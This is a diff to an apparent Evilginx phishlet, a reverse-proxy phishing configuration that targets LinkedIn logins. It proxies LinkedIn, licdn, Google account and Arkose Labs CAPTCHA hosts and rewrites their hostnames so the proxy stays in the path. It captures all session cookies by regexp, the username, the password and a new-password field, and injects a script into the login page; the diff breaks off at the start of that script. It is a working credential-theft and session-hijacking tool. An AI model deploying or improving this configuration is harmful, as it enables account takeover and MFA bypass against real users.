@@ -1,11 +1,90 @@
-author: '@mrgretzky'
+author: '@an0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
-sub_filters: []
+  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'linkedin.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin-ei.com', session: true, is_landing: false}
+  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'linkedin-ei.com', session: false, is_landing: false}  
+  - {phish_sub: 'static-exp1', orig_sub: 'static-exp1', domain: 'licdn.com', session: false, is_landing: false}
+  - {phish_sub: 'media-exp1', orig_sub: 'media-exp1', domain: 'licdn.com', session: false, is_landing: false}
+  - {phish_sub: 'realtime.www', orig_sub: 'realtime.www', domain: 'linkedin.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'iframe', orig_sub: 'iframe', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'iframe', orig_sub: 'iframe', domain: 'arkoselabs.cn', session: false, is_landing: false}
+  - {phish_sub: 'linkedin-api', orig_sub: 'linkedin-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+
+
+
+
+sub_filters:
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'linkedin.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'licdn.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'linkedin-ei.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.com', search: ':"https://iframe.arkoselabs.com"}', replace: ':"https://iframe.{domain}"}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.cn', search: 'C()?"https://iframe.arkoselabs.cn":', replace: 'C()?"https://iframe.{domain}":', mimes: ['text/javascript', 'application/javascript']}
+
+  - {triggers_on: 'static-exp1.licdn.com', orig_sub: '', domain: 'arkoselabs.com', search: ':"https://iframe.arkoselabs.com"}', replace: ':"https://iframe.{domain}"}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'static-exp1.licdn.com', orig_sub: '', domain: 'arkoselabs.cn', search: 'C()?"https://iframe.arkoselabs.cn":', replace: 'C()?"https://iframe.{domain}":', mimes: ['text/javascript', 'application/javascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.com', search: '{domain_regex}', replace: '{domain}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.cn', search: '{domain_regex}', replace: '{domain}', mimes: ['text/javascript', 'application/javascript']}
+
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'linkedin-api', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'linkedin-api', domain: 'arkoselabs.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'linkedin-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin-ei.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin-ei.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin-ei.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin-ei.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin-ei.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin-ei.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'media-exp1', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'media-exp1', domain: 'licdn.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'media-exp1', domain: 'licdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'realtime.www', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'realtime.www', domain: 'linkedin.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'realtime.www', domain: 'linkedin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+
 auth_tokens:
   - domain: '.www.linkedin.com'
-    keys: ['li_at']
+    keys: ['.*,regexp']
+  - domain: '.linkedin.com'
+    keys: ['.*,regexp']
+    
+
+auth_urls:
+  - '/feed'    
+  - '/feed/'
+  - '/home'
+  - '/home/'
+  
 credentials:
   username:
     key: 'session_key'
@@ -15,12 +94,17 @@ credentials:
     key: 'session_password'
     search: '(.*)'
     type: 'post'
+  custom:
+    - key: 'newPassword'
+      search: '(.*)'
+      type: 'post'
 login:
   domain: 'www.linkedin.com'
   path: '/uas/login'
+
 js_inject:
   - trigger_domains: ["www.linkedin.com"]
-    trigger_paths: ["/uas/login"]
+    trigger_paths: [""]
     trigger_params: ["email"]
     script: |
       function lp(){
